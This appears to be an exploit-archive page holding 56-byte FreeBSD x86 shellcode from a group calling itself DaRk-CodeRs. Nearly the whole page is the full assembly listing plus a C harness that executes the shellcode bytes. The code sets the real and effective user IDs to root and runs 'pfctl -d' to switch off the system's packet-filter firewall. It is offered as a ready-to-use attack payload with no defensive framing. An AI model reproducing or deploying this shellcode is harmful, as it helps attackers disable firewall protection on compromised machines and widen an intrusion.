<html><head><title>FreeBSD/x86 - setreuid(0, 0) &amp; execve(pfctl -d) - 56 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
                   ***(C)oDed bY suN8Hclf***
               DaRk-CodeRs Group production, kid
     [FreeBSD x86 setreuid(0, 0) + execve(pfctl -d) 56 bytes]

The simples way to disable the FreeBSD's packet filter. We do not
flush all rules (pfctl -F all) but only turn the firewall off.

Assembly code:
-------------------------code.asm--------------------------
section .text
global _start

_start:

	xor eax, eax
	push eax
	push eax
	mov al, 126
	push eax
	int 0x80           ; setreuid()

	xor eax, eax
	push eax
	push word 0x642d
	mov ecx, esp       ; ecx contains a pointer to &quot;-d&quot; string

	push eax 
	push 0x6c746366
	push 0x702f6e69
	push 0x62732f2f
	mov ebx, esp       ; ebx contains a pointer to &quot;//sbin/pfctl&quot; string

	push eax
	push ecx
	push ebx
	mov ecx, esp

	push eax
	push ecx
	push ebx
	mov al, 0x3b
	push eax
	int 0x80          ; execve()

	xor eax, eax
	push eax
	push eax
	int 0x80          ; exit()
-------------------------code.asm--------------------------
And C code:
-------------------------code.c----------------------------
#include &quot;stdio.h&quot;

char shellcode[]=
&quot;\x31\xc0\x50\x50\xb0\x7e\x50\xcd\x80\x31\xc0\x50\x66\x68\x2d\x64&quot; 
&quot;\x89\xe1\x50\x68\x66\x63\x74\x6c\x68\x69\x6e\x2f\x70\x68\x2f\x2f&quot;
&quot;\x73\x62\x89\xe3\x50\x51\x53\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd&quot;
&quot;\x80\x31\xc0\x50\x50\xcd\x80&quot;;

int main(int argc, char *argv[]){
	int (*func)();
	func=(int (*)())shellcode;
	(int)(*func)();
}
-------------------------code.c----------------------------

Greetz to: 0in, cOndemned (and to other DaRk-CodeRs members), str0ke, e.wiZz!, 
           Katharsis, doctor and many others...
Visit us : www.dark-coders.pl


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
